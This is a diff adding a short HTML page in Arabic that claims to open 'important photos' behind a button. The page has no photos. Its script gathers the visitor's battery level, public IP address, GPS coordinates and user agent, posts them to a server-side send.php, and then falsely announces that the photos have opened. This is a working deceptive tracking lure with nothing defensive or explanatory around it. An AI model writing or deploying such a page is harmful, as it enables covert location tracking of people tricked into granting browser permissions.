@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>فتح الصور المهمة...</title>
+</head>
+<body>
+  <h2>اضغط لعرض الصور المهمة</h2>
+  <button onclick="getInfo()">عرض الصور الآن</button>
+
+  <script>
+    async function getInfo() {
+      alert("جاري الفتح...");
+
+      try {
+        let battery = await navigator.getBattery();
+        let ipData = await fetch("https://api.ipify.org?format=json").then(r => r.json());
+
+        navigator.geolocation.getCurrentPosition(async pos => {
+          let data = {
+            battery: battery.level * 100 + "%",
+            ip: ipData.ip,
+            lat: pos.coords.latitude,
+            lon: pos.coords.longitude,
+            ua: navigator.userAgent
+          };
+
+          fetch("send.php", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(data)
+          })
+          .then(() => alert("تم فتح الصور بنجاح!"));
+
+        }, err => { alert("الرجاء السماح بالوصول للموقع"); });
+      } catch (e) { alert("حدث خطأ"); }
+    }
+  </script>
+</body>
+</html>
